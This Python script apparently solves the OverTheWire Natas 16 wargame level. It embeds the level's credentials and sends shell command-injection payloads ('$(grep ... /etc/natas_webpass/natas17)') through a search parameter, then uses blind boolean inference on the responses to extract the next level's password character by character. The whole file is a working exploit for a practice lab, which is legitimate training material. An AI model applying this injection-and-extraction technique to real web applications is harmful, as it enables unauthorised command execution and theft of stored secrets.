#!/usr/bin/env python3

import requests
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas16.natas.labs.overthewire.org/index.php"
CREDS = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
QUERY = "?submit=Search&needle="

def output(passw, currentChar, message ,end):
    print(f"{message} {len(passw)} out of X chars found: {passw + currentChar}", end=end)


s = requests.session()
s.auth = CREDS

charsInPassword = ""
for char in CHARS:
    output(charsInPassword, char, "Characters in password","\r")

    payload = f"$(grep {char} /etc/natas_webpass/natas17)snake"
    fullquery = QUERY + payload

    resp = s.get(ADDR + fullquery)

    if not "snake" in resp.text:
        charsInPassword += char

print("\n\n")

password = ""
prefix = False

while True:
    pass_copy = password

    for char in charsInPassword:


        tmp_pass = ""
        if prefix:
            tmp_pass = char + password
        else:
            tmp_pass = password + char

        payload = f"$(grep {tmp_pass} /etc/natas_webpass/natas17)snake"

        fullquery = QUERY + payload

        resp = s.get(ADDR + fullquery)

        if not "snake" in resp.text:
            password = tmp_pass
            prefix = False
        
        output(tmp_pass, "", "Actual password", "\r")


    if password == pass_copy:
        if prefix:
            output(password, "", "", "")
            break
        else:
            prefix = True
